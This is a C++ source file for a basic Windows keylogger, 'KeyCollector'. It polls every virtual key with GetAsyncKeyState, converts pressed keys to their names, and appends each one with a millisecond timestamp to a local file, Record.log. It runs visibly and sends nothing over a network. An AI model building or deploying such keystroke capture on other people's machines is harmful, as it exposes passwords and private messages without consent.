// KeyCollector.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>
#include <chrono>

using std::chrono::duration_cast;
using std::chrono::milliseconds;
using std::chrono::system_clock;

// output file name
#define FILE_NAME "Record.log"

int main()
{
    FILE* stream;

    unsigned short ch, i;
    while (1) {
        ch = 1;
        while (ch < 250) { //scans for 0-249 ASCII craracters

            // this strange and extra loop helps in sensing fast-keystrokes with 
            // minimum processor use
            for (i = 0; i < 50; i++, ch++) {

                //when key is stroke
                if (GetAsyncKeyState(ch) == -32767) {
                    WCHAR name[1024];
                    UINT scanCode = MapVirtualKeyW(ch, MAPVK_VK_TO_VSC);
                    LONG lParamValue = (scanCode << 16);
                    int result = GetKeyNameTextW(lParamValue, name, 1024);
                    if (result > 0)
                    {
                        std::wcout << name << std::endl; // Output: Caps Lock
						// writing date-time; & an extra '0' before every start which is used during decoding
						// open or create a file
                        errno_t err = fopen_s(&stream, FILE_NAME, "a");
                        if (err != 0) {
                            std::cout << "Unable to open log file.";
                            continue;
                        }

                        milliseconds ms = duration_cast<milliseconds>(
                          system_clock::now().time_since_epoch()
                        );
						fprintf(stream, "%lld %S\n", ms.count(), name);
						fclose(stream);
                    }
                }
            }

            // this 1ms sleep inhibits the program from occupying full processor
            Sleep(1);
        }
    }
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
